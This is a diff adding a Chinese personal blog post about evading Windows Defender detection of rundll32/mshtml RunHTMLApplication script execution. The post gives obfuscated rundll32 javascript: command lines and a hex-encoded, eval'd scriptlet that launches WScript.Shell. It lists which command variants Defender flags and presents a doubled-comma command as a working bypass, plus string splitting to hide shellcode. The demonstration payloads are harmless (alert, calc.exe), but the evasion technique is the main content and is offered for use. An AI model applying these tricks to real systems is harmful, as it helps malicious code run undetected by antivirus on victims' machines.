@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>绕过defender检测 | Zer0-hex&#39;s Blog</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://Zer0-hex.github.io/favicon.ico?v=1666449900454">
+<link rel="stylesheet" href="https://Zer0-hex.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="360就算了，360看到rundll32.exe就爆毒了。
+在exploit-db上发现一个外国大佬写的绕过wdf检测。
+链接：https://www.exploit-db.com/exploits/50654
+他的失效了，所以我延续他的思..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://Zer0-hex.github.io">
+        <img src="https://Zer0-hex.github.io/images/avatar.png?v=1666449900454" class="site-logo">
+        <h1 class="site-title">Zer0-hex&#39;s Blog</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      What are fucking doing?
+    </div>
+    <div class="site-footer">
+      Hack for <a href="https://github.com/Zer0-hex" target="_blank">Zer0-hex</a> | <a class="rss" href="https://Zer0-hex.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">绕过defender检测</h2>
+            <div class="post-date">2022-09-09</div>
+            
+            <div class="post-content" v-pre>
+              <p>360就算了，360看到rundll32.exe就爆毒了。</p>
+<p>在exploit-db上发现一个外国大佬写的绕过wdf检测。<br>
+链接：https://www.exploit-db.com/exploits/50654</p>
+<p>他的失效了，所以我延续他的思路整了个新的。</p>
+<ul>
+<li>命令执行绕过</li>
+</ul>
+<p>路径混淆</p>
+<pre><code>C:\&gt;rundll32.exe javascript:&quot;\..\..\..\mshtml,RunHTMLApplication &quot;;alert(666)
+</code></pre>
+<p>但是已经被wdf捕获了特征。</p>
+<ul>
+<li>shellcode绕过方法</li>
+</ul>
+<p>十六进制编码</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;component&gt;
+&lt;script&gt;
+&lt;![CDATA[
+var hex = &quot;6E657720416374697665584F626A6563742822575363726970742E5368656C6C22292E52756E282263616C632E6578652229&quot;;
+var str = '';
+for (var n = 0; n &lt; hex.length; n += 2) {
+str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));
+}
+eval(str)
+]]&gt;
+&lt;/script&gt;
+&lt;/component&gt;
+</code></pre>
+<p>目前也已经被wdf捕获。</p>
+<h2 id="新的绕过方法">新的绕过方法</h2>
+<p>这位大佬给我提供了思路，我在尝试绕过时发现wdf的一些特性：</p>
+<ol>
+<li>针对拆分的命令不会检测。</li>
+<li>针对组合的函数调用，不加参数，会被检测。</li>
+<li>针对错误的语法(或者说wdf内未出现的语法)不会检测。</li>
+</ol>
+<ul>
+<li>以下都是安全的命令(有些可能无法执行)：</li>
+</ul>
+<pre><code>C:\&gt; rundll32.exe
+C:\&gt; rundll32.exe javascript:&quot;\..\..\..\mshtml,&quot;
+C:\&gt; rundll32.exe javascript:&quot;\..\..\..\,mshtml,RunHTMLApplicatio&quot;;alert(2333)      # RunHTMLApplication少了个n 
+C:\&gt; javascript:&quot;\..\..\..\,mshtml,RunHTMLApplication,,,&quot;;alert(2333)
+C:\&gt; rundll32.exe mshtml RunHTMLApplication
+</code></pre>
+<ul>
+<li>以下情况是会被检测到的</li>
+</ul>
+<pre><code>C:\&gt; rundll32.exe javascript:&quot;\..\..\..\,mshtml,RunHTMLApplication &quot;
+C:\&gt; rundll32.exe javascript:&quot;\..\..\..\,mshtml,RunHTMLApplication &quot;;alert(2333)
+C:\&gt; rundll32.exe javascript:&quot;\..\..\..\,mshtml,RunHTMLApplication,,,&quot;
+C:\&gt; rundll32.exe javascript:&quot;\..\..\..\\\\\mshtml,RunHTMLApplication&quot;;alert(2333)
+</code></pre>
+<ul>
+<li>结论</li>
+</ul>
+<pre><code>wdf先对语法检测，通过才可以执行。
+rundll32.exe mshtml RunHTMLApplication 同时出现时不会被检测到
+</code></pre>
+<h2 id="新的绕过方法-2">新的绕过方法</h2>
+<ul>
+<li>命令执行绕过</li>
+</ul>
+<pre><code>rundll32.exe javascript:&quot;\..\..\..\mshtml,,RunHTMLApplication &quot;;alert(2333)
+</code></pre>
+<ul>
+<li>Shellcode绕过</li>
+</ul>
+<pre><code>简单的字符串分段相加即可，So easy。
+</code></pre>
+<p>记得用cmd运行。</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://Zer0-hex.github.io/post/x86-chang-yong-hui-bian-zhi-ling-su-cha-biao/">
+                  <h3 class="post-title">
+                    X86常用汇编指令速查表
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
